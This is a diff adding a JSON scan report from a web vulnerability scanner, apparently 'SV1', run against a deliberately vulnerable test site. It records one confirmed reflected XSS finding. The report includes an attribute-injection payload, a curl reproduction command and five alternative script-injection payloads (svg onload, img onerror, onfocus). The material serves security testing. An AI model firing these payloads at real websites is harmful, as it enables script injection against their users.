@@ -1,0 +1,87 @@
+{
+  "tool": "SV1",
+  "author": "ee.zvz",
+  "version": "1.4.0",
+  "meta": {
+    "target": "https://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=test",
+    "crawl": false,
+    "depth": 0,
+    "scanners": [
+      "xss"
+    ],
+    "time_based": false,
+    "union": true,
+    "replay": true,
+    "browser": true,
+    "stored": false,
+    "hidden": false,
+    "js": false,
+    "external_js": false,
+    "har": false,
+    "request": false,
+    "data": false,
+    "json": false,
+    "second_order": false,
+    "hidden_fields": false,
+    "password_fields": false,
+    "storage_state": false,
+    "saved_storage_state": "",
+    "dump": false,
+    "spa": false,
+    "openapi": false,
+    "blind": false,
+    "ssrf": false,
+    "oob": "",
+    "fail_on": "none",
+    "scope": "",
+    "db": "",
+    "sarif": "",
+    "retest": false
+  },
+  "stats": {
+    "pages": 1,
+    "points": 1,
+    "requests": 12,
+    "errors": 0,
+    "verified": 1,
+    "confirmed": 1,
+    "replayed": 0,
+    "unverified": 0,
+    "fixed": 0,
+    "retest": false,
+    "duration_seconds": 18.38
+  },
+  "counts": {
+    "total": 1,
+    "by_severity": {
+      "HIGH": 1
+    },
+    "by_type": {
+      "XSS": 1
+    }
+  },
+  "findings": [
+    {
+      "kind": "XSS",
+      "severity": "HIGH",
+      "url": "https://public-firing-range.appspot.com/reflected/parameter/attribute_name",
+      "method": "GET",
+      "param": "q",
+      "payload": "sv1376d4837 onmouseover=\"alert('sv1376d4837')\" x=",
+      "confidence": "CONFIRMED",
+      "evidence": "executed in chromium: alert:sv1376d4837",
+      "technique": "reflected/attr",
+      "detail": "execution confirmed in chromium (inside <tag> attribute ? (bare quoted)) | proof: alert fired",
+      "artifact": "sv1-artifacts/xss-01.png",
+      "curl": "curl -sS 'https://public-firing-range.appspot.com/reflected/parameter/attribute_name?q=sv1376d4837+onmouseover%3D%22alert%28%27sv1376d4837%27%29%22+x%3D'",
+      "data": {},
+      "alternatives": [
+        "sv1376d4837 autofocus onfocus=\"alert('sv1376d4837')\" x=",
+        "sv1376d4837><svg/onload=alert('sv1376d4837')>",
+        "sv1376d4837><img src=x onerror=alert('sv1376d4837')>",
+        "sv1376d4837\"><svg/onload=alert('sv1376d4837')>",
+        "sv1376d4837'><svg/onload=alert('sv1376d4837')>"
+      ]
+    }
+  ]
+}
